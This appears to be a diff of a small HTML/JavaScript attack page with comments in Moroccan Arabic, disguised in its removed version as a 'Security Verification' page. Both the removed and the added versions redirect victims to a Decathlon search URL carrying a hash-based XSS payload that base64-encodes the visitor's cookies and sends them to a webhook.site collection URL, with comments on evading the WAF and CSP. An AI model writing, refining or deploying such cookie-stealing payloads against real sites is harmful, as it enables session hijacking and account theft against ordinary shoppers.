@@ -1,19 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Security Verification...</title>
-</head>
-<body>
-    <script>
-        // الكود اللي غيتنفذ وسط Decathlon باش يسحب الداتا
-        // استعملنا b64Data باش نضمنوا أن الرموز في الكوكيز ما يهرسوش الرابط
-        let exfiltrate = "fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(document.cookie), {mode:'no-cors'})";
-        
-        // استغلال ثغرة الـ Hash (#) اللي لقينا باش نهربو من الـ WAF
-        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
-        
-        // تنفيذ التحويل التلقائي
-        window.location.href = finalTarget;
-    </script>
-</body>
-</html>
+<script>
+    // استعملنا Image() حيت هي "الساروت" اللي كيهرب من الـ CSP
+    let payload = "var i=new Image(); i.src='https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(document.cookie);";
+    
+    // استغلال الـ Hash (#) اللي ديما كيسلكنا
+    let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval('" + payload + "')>";
+    
+    window.location.href = finalTarget;
+</script>
